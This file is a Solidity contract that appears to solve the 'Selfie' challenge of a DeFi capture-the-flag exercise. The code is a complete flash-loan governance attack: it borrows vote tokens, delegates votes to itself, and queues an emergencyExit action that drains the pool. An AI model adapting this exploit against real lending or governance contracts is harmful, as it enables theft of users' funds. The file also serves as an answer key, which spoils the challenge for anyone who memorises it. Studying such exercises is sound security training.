// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SelfiePool, IERC3156FlashBorrower} from "../../src/selfie/SelfiePool.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    uint256 private actionId;
    address private recovery;

    SelfiePool private pool;
    SimpleGovernance private governance;
    DamnValuableVotes private voteToken;

    constructor(
        address _pool,
        address _governance,
        address _voteToken,
        address _recovery
    ) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        voteToken = DamnValuableVotes(_voteToken);
        recovery = _recovery;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSelector(
            pool.emergencyExit.selector,
            recovery
        );

        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(voteToken),
            TOKENS_IN_POOL,
            data
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        voteToken.delegate(address(this));

        actionId = governance.queueAction(address(pool), 0, data);

        voteToken.approve(address(pool), amount + fee);

        return CALLBACK_SUCCESS;
    }

    function executeTransfer() external {
        governance.executeAction(actionId);
    }
}
